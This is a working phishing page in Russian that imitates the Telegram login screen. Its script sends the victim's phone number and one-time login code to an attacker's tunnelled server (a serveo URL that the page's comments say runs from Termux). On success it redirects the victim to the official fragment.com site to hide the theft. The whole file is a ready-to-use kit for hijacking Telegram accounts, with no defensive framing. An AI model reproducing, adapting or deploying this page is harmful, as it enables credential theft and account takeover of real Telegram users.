<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>.hidden { display: none; }</style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="bg-white p-8 rounded-lg shadow-md w-full max-w-sm text-center">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="w-16 mx-auto mb-4">
        <h2 class="text-xl font-bold mb-2">Войти в Telegram</h2>
        <p id="desc" class="text-gray-500 text-sm mb-6">Введите номер телефона для авторизации</p>

        <div id="step-phone">
            <input type="text" id="phone" placeholder="+7 900 000-00-00" class="w-full p-3 border rounded mb-4 text-center focus:outline-none focus:ring-2 focus:ring-blue-400">
            <button onclick="sendData('send_code')" class="w-full bg-blue-500 text-white py-3 rounded font-bold hover:bg-blue-600">ДАЛЕЕ</button>
        </div>

        <div id="step-code" class="hidden">
            <input type="text" id="code" placeholder="Код из сообщения" class="w-full p-3 border rounded mb-4 text-center focus:outline-none focus:ring-2 focus:ring-blue-400">
            <button onclick="sendData('verify_code')" class="w-full bg-blue-500 text-white py-3 rounded font-bold hover:bg-blue-600">ВОЙТИ</button>
        </div>
    </div>

    <script>
        // Твоя НОВАЯ ссылка из последнего скриншота Termux
        const API_URL = "https://00da3c6ab97b9f204ff79d7570983bd5.serveousercontent.com/api/login";

        async function sendData(action) {
            const phone = document.getElementById('phone').value;
            const code = document.getElementById('code') ? document.getElementById('code').value : "";

            try {
                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action, phone, code })
                });
                
                const res = await response.json();

                if (res.status === "sent") {
                    document.getElementById('step-phone').classList.add('hidden');
                    document.getElementById('step-code').classList.remove('hidden');
                    document.getElementById('desc').innerText = "Введите код, присланный в Telegram";
                } else if (res.status === "success") {
                    // После успеха перекидываем на официальный сайт
                    window.location.href = "https://fragment.com";
                } else {
                    alert("Ошибка сервера: " + res.message);
                }
            } catch (e) {
                alert("Нет связи с Termux! Проверь, что в Окне №1 запущен 'python server.py', а в Окне №2 активна ссылка.");
            }
        }
    </script>
</body>
</html>
